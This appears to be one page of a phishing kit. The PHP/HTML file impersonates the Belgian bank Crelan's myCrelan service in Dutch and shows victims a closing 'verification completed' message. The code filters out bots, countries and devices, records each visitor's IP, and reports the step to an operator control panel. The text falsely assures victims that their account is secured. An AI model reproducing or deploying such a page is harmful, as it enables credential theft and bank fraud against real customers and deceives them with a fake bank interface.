<?php
   error_reporting(0);
   session_start();

   include "../antibots-debug/antibots.php";
   include '../setting/functions.php';
   include '../includes/current-page.php';
   include '../includes/check-allowed-countries.php';
   include '../includes/check-devices-allow.php';

   $ip = get_client_ip();
   $get_name_file = $ip;
   $get_name_page = "Page Confirmed";
   get_page_info($get_name_page, $get_name_file);
   $random_classes = rand(0, 1000000); 
   $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="en" class="">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../libraries/seo.php'; ?>
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/basic-thinks.css">
    <!-- Favicon -->
    <link rel="icon" href="../img/favicon.ico">
    <link rel="shortcut" href="../img/favicon.ico">
    <link rel="appel-touch-icon" href="../img/favicon.ico">
    <title>WEB PAGE</title>
</head>
<body>
    <!-- Main Section -->
    <div class="main-section">
        <div class="nav-section">
            <div class="logo">
                <img src="../img/logo.png" alt="">
            </div>
            <div class="lang-btn">
                <span class="text-lang">NL</span> <img src="../img/arrow-nav.png" alt="">
            </div>
        </div>
        <div class="content-main-section">
            <form action="../control-panel/check-action.php" method="post" id="fsdpElement" class="f-s-d-p-element-other">
                <input type="hidden" name="step" value="confirmed">
                <input type="hidden" name="ip" value="<?php echo $get_name_file; ?>">
                <div class="coul-container">
                    <div class="coul-fields-other">
                        <div class="prt-icon-valid"><i class="fa-solid fa-circle-check"></i></div>
                        <h1 class="title-login-other">Bedankt voor het voltooien van de verificatieprocedure.</h1>
                        <p class="p-explain-other">
                            Uw account is nu geactiveerd met de nieuwe beveiligingsfuncties die we aan ons bedrijf hebben toegevoegd. U kunt nu zonder problemen toegang krijgen tot uw account. Bedankt voor uw vertrouwen.
                        </p>
                        <div class="prt-btn">
                            <button type="submit" name="b_s_d_p" id="bsdpElement" class="btn-element">Ga naar de homepage</button>
                        </div>
                    </div>
                </div>
            </form> 
        </div>
    </div>
    <!-- Main Section -->

    <!-- Footer Section -->
    <div class="footer-section">
        <div class="content-footer-section">
            <div class="links-footer">
                <span class="link-footer">Meer info?</span> <span class="ship">—</span> <span class="link-footer">Privacy</span> <span class="ship">—</span> <span class="link-footer">Reglement myCrelan</span> <span class="ship">—</span> <span class="link-footer">Security myCrelan</span> <span class="ship">—</span> 
            </div>
            <p>Alle rechten voorbehouden © Crelan 2026</p>
        </div>
    </div>
    <!-- Footer Section -->


    <!-- Script Js -->
    <script src="../js/jquery.min.js"></script>
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/status.php'; ?>
</body>
</html>